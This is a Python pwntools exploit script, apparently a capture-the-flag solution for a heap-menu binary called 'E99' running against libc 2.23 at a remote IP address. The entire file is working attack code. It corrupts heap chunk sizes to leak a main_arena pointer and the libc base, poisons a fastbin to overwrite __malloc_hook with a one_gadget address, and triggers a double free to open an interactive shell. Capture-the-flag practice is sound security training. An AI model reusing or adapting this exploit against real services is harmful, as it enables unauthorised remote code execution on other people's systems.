#coding=utf8
from pwn import*
p = remote('47.103.214.163',20302)
#p = process('./E99')
elf = ELF('E99')
libc = ELF('libc-2.23.so')
puts_got = elf.got['puts']
context.log_level = 'debug'
context(arch = 'amd64',os ='linux')
def add(size,content):
	p.sendlineafter('edit\n:','1')
	p.sendlineafter('size?',str(size)) # size<=256
	p.sendafter('content:',content)
def dele(index):
	p.sendlineafter('edit\n:','2')
	p.sendlineafter('index?',str(index))
def show(index):
	p.sendlineafter('edit\n:','3')
	p.sendlineafter('index?',str(index))
def edit(index,content):
	p.sendlineafter('edit\n:','4')
	p.sendlineafter('index?',str(index))
	p.sendafter('content:',content)
add(0x28,'\n') #0
add(0xF8,'\n') #1
add(0x68,'\n') #2
add(0x60,'\n') #3
dele(1)
payload = '\x00'*0x28 + '\x71'
edit(0,payload)
payload = '\x00'*0x60 + p64(0x170) + '\x70'
edit(2,payload)
add(0xF8,'\n')
show(2)
main_arena = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 88
log.success('Main_Arena:\t' + hex(main_arena))
libcbase = main_arena - (libc.symbols['__malloc_hook'] + 0x10)
malloc_hook = libcbase + libc.symbols['__malloc_hook']
one_gadget = libcbase + 0xF1147
add(0x60,'\n')
dele(3)
dele(2)
payload = p64(malloc_hook-0x23)+'\n'
edit(4,payload)
add(0x60,'\n')
add(0x60,'\x00'*0x13 + p64(one_gadget)+'\n')
#p.sendlineafter('edit\n:','1')
#p.sendlineafter('size?','32')
dele(2)
dele(4)
p.interactive()
